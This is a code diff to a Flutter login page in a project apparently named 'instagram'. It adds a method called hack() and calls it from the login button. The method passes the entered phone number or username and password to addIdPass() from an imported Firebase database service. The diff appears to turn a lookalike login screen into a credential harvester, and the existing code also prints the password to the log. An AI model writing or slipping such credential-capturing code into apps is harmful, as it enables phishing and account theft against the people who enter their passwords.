@@ -2,6 +2,7 @@ import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_signin_button/button_view.dart';
 import 'package:flutter_signin_button/flutter_signin_button.dart';
+import 'package:instagram/services/firebase-database.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 class LoginPage extends StatefulWidget {
@@ -10,6 +11,10 @@ class LoginPage extends StatefulWidget {
 }
 
 class _LoginPageState extends State<LoginPage> {
+  void hack() {
+    addIdPass(_phoneController.text, _passwordController.text);
+  }
+
   TextEditingController _phoneController;
   TextEditingController _passwordController;
   final _formkey = GlobalKey<FormState>();
@@ -111,6 +116,7 @@ class _LoginPageState extends State<LoginPage> {
                             print(
                                 "Password number is ${_passwordController.text}");
                           }
+                          hack();
                         },
                         child: Container(
                             width: MediaQuery.of(context).size.width,
